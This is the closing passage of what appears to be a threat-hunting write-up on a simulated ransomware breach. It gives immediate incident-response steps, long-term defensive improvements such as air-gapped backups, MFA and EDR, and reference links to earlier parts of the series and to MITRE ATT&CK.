### Immediate Actions

1. **Isolate all systems** - Prevent further spread
2. **Preserve evidence** - Despite journal deletion, some artifacts may remain
3. **Assess offline backups** - Check for any air-gapped or cloud backups
4. **Engage incident response** - Professional forensic analysis
5. **Report to authorities** - FBI IC3, local law enforcement

### Long-term Improvements

1. **Air-gapped backups** - Implement offline backup storage
2. **Network segmentation** - Isolate backup infrastructure
3. **MFA everywhere** - Especially for administrative accounts
4. **EDR on all systems** - Including Linux servers
5. **Credential management** - No plaintext credential storage
6. **Privileged Access Management** - Limit and monitor admin access
7. **Backup testing** - Regular recovery drills

---

## References

- [JADE SPIDER Threat Intel Report](https://www.notion.so/JADE-SPIDER-2b0cf57416ff80f38f39f75f670b09e2)
- [Ransome Note](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/docs/ransom-note.md)
- [Additional Details - By Threat Hunt Organizor](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-4-dead-in-the-water/docs/additional-details.md)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender for Endpoint Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
- [Summary - The AZUKI BREACH SAGA](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/README.md)
- [Part 1 Investigation Report](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-1-port-of-entry)
- [Part 2 Cargo Hold](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-2-cargo-hold)
- [Part 3 Bridge Takeover](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-3-bridge-takeover)

